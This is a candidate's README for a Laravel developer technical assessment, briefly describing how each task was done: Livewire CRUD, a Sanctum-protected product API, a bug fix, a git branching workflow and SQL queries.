# **Laravel Developer Technical Assessment**  

## **Task 1: Laravel CRUD Operations**  
### **Objective:**  
Build a simple **Task Management System** using Laravel.  

### **Requirements:**  
1. Create a `Task` model with the following fields:  
   - `title` (string, required)  
   - `description` (text, optional)  
   - `status` (enum: `pending`, `completed`, default: `pending`)  
   - `due_date` (date, required)  
2. Implement **CRUD operations** using Laravel controllers and views.  
3. Add **validation rules** (e.g., `title` is required, `due_date` must be a future date).  
4. Implement **Eloquent Scopes** to filter tasks (`pending` or `completed`).  
5. Set up **Laravel authentication** (Breeze or Laravel UI).  


Apporoach: 
I used Laravel Breeze for Authentication
Created Task Model and Migration
Installed Livewire
Created Livewire Component for single page CRUD with modals (Task)
Routed the Task component as  single page containing functions for other tasks such as create, update, add form, edit form, delete, Mark as done
The Add and Edit form are represented in modals while the the page displays the Tasks with live updates 
Created TaskVallidationRule Trait for reusable task input validation with custom validation messages
Protected route with sanctum



## **Task 2: API Development**  
### **Objective:**  
Create a RESTful API for managing products.  

### **Requirements:**  
1. Create a `Product` model with:  
   - `name` (string, required)  
   - `price` (decimal, required)  
   - `stock` (integer, required)  
2. Develop an **API controller** with CRUD operations.  
3. Use **Laravel Sanctum or Passport** for authentication.  
4. Validate API requests (e.g., `price` must be numeric, `stock` must be positive).  
5. Write at least **one unit test** for an API endpoint.  


Approach:
Created ProductResource for structuring json response
Created Product Controller for all logic
Routed all api urls required for CRUD functions using api resource methods (post, get, put, patch, delete) nd a prefix of v1
Performed all necessry logic operatons for each CRUD function returning json error or json responce with resource when neccessary
Protected route with sanctum
Created Test file to test the create endpoint. Test works

{app_url}api/v1/{api_routes}


## **Task 3: Debugging & Optimization**  
### **Objective:**  
Identify and fix issues in the provided buggy code.  

### **Instructions:**  
- Open the **`https://raw.githubusercontent.com/Emperor-khay/Gloztec_Solutions_Laravel_Assessment/main/taxinomist/Gloztec_Solutions_Laravel_Assessment.zip`** file.  
- The code inside has several issues.  
- Fix the bugs and optimize the code.  
- Explaing what you fixed in **https://raw.githubusercontent.com/Emperor-khay/Gloztec_Solutions_Laravel_Assessment/main/taxinomist/Gloztec_Solutions_Laravel_Assessment.zip** file.  


Approach:
Created a fully functional Task api CRUD as a fix 
See TaskController for fixed code and BuggyCodeFix.md for Identified Errors


## **Task 4: Git Assessment**  
### **Objective:**  
Demonstrate proper **Git usage** in a real-world scenario.  

### **Instructions:**  
1. Create a new branch named **`feature/task-improvement`**.  
2. Make improvements to the Task Management System.  
3. Commit your changes with **meaningful messages** (e.g., `fix: added validation for task status`).  
4. Open a **Pull Request (PR)** and describe your changes.  


Approach:
At the time of writing this, my completed assessment has already been pushed to my repository, so this will act as my Task Management fix for the completion of this task
git add .
git commit -m "Explained My Approach In Updated ReadMe File"
git checkout -b feature/task-improvement
git push assessment feature/task-improvement
go to browser and create pull request


## **Task 5: SQL Query Challenge**  
### **Objective:**  
Write optimized MySQL queries for an e-commerce database.  

### **Scenario:**  
You have the following tables:  

**`orders`**  
| id | user_id | total_amount | created_at |  
|----|---------|--------------|------------|  

**`order_items`**  
| id | order_id | product_id | quantity | price |  
|----|---------|------------|----------|------|  

### **Queries:**  
1. Retrieve the **top 5 customers** with the highest total spending.  
2. Get the **total revenue** for the current month.  
3. List the **most sold products**.  


Approach:
Created sql file for raw SQL query.
See Query in querry_challange.sql



Thank you!
